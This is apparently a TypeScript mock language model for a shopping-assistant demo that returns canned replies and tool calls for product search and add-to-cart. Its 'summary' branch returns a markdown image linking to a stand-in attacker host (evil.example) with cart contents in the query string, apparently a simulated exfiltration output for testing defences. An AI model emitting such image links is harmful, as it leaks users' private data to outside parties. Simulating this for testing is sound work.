// A fake model that needs no key and costs nothing. It is not a real model:
// it looks at the last message and returns canned replies. See src/lib/model.ts for a real one.
import { simulateReadableStream } from 'ai';
import { MockLanguageModelV4 } from 'ai/test';

const usage = {
  inputTokens: { total: 120, noCache: 120, cacheRead: 0, cacheWrite: 0 },
  outputTokens: { total: 40, text: 40, reasoning: 0 },
};

function textStream(text: string) {
  const words = text.split(/(?<= )/);
  return {
    stream: simulateReadableStream({
      chunks: [
        { type: 'stream-start' as const, warnings: [] },
        { type: 'text-start' as const, id: 't' },
        ...words.map((delta) => ({ type: 'text-delta' as const, id: 't', delta })),
        { type: 'text-end' as const, id: 't' },
        { type: 'finish' as const, finishReason: { unified: 'stop' as const, raw: 'stop' }, usage },
      ],
    }),
  };
}

function toolCallStream(toolName: string, input: unknown) {
  return {
    stream: simulateReadableStream({
      chunks: [
        { type: 'stream-start' as const, warnings: [] },
        { type: 'tool-call' as const, toolCallId: `call-${Math.random().toString(36).slice(2, 8)}`, toolName, input: JSON.stringify(input) },
        { type: 'finish' as const, finishReason: { unified: 'tool-calls' as const, raw: 'tool_calls' }, usage },
      ],
    }),
  };
}

type Part = { type: string; text?: string; toolName?: string; output?: { type: string; value?: unknown } };
type Message = { role: string; content: string | Part[] };

function userText(m: Message) {
  return typeof m.content === 'string' ? m.content : m.content.map((p) => p.text ?? '').join(' ');
}

function lastSearchResults(prompt: Message[]): { id: string; name: string; price: number }[] {
  for (const m of [...prompt].reverse()) {
    if (m.role !== 'tool' || typeof m.content === 'string') continue;
    for (const p of m.content) {
      if (p.type === 'tool-result' && p.toolName === 'searchProducts' && Array.isArray(p.output?.value)) {
        return p.output.value as { id: string; name: string; price: number }[];
      }
    }
  }
  return [];
}

export const fakeModel = new MockLanguageModelV4({
  doStream: async (options) => {
    const prompt = options.prompt as unknown as Message[];
    const last = prompt.at(-1)!;

    if (last.role === 'tool' && typeof last.content !== 'string') {
      const result = last.content.find((p) => p.type === 'tool-result');
      if (result?.toolName === 'searchProducts') {
        const items = (result.output?.value as { name: string; price: number }[] | undefined) ?? [];
        return textStream(items.length ? `I found ${items.length} products. Use the button under the one you like to add it to the cart.` : 'I could not find any product matching that search.');
      }
      if (result?.toolName === 'addToCart') {
        return textStream(result.output?.type === 'json' ? 'I added the product to the cart.' : 'All right, I did not add the product to the cart.');
      }
    }

    const text = userText(last);

    if (/summary/i.test(text)) {
      return textStream('Summary ready. ![summary](https://evil.example/c.png?d=CART-CONTENTS)');
    }

    if (/add .* to cart/i.test(text)) {
      const id = text.match(/p-\d{2}/)?.[0] ?? lastSearchResults(prompt)[0]?.id;
      if (!id) return textStream('We should search for a product first.');
      return toolCallStream('addToCart', { productId: id, quantity: 1 });
    }

    const maxPrice = text.match(/(\d[\d,]*)\s*(eur|€|euros?)/i)?.[1]?.replace(',', '');
    const query = /shoe|sneaker/i.test(text) ? 'shoes' : /sock|hat|bottle|belt|tee|jacket|legging|watch/i.exec(text)?.[0] ?? '';
    return toolCallStream('searchProducts', { ...(query ? { query } : {}), ...(maxPrice ? { maxPrice: Number(maxPrice) } : {}) });
  },
});
